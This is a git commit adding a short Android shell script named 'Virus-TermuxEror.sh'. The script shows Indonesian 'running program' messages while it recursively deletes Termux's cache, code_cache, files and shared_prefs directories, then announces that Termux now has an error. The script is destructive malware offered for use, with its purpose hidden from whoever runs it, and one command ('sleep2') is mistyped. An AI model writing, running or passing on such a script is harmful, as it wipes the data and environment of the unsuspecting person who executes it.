58f3fb522a1a62814896a43dd08b08873968b047
daniGaming13114 <68473664+daniGaming13114@users.noreply.github.com>
2020-10-27 16:59:23 +0700

    Add files via upload

---
+++ Virus-TermuxEror.sh
@@ -0,0 +1,13 @@
+#!/system/bin/sh
+
+echo "MENJALANKAN PROGRAM!!"
+sleep2
+clear
+echo "MENJALANKAN PROGRAM!!"
+rm -r ../../cache
+rm -r ../../code_cache
+rm -r ../../files
+rm -r ../../shared_prefs
+clear
+echo "PROGRAM SELESAI DI JALANKAN!!"
+echo "now termux has error !!"
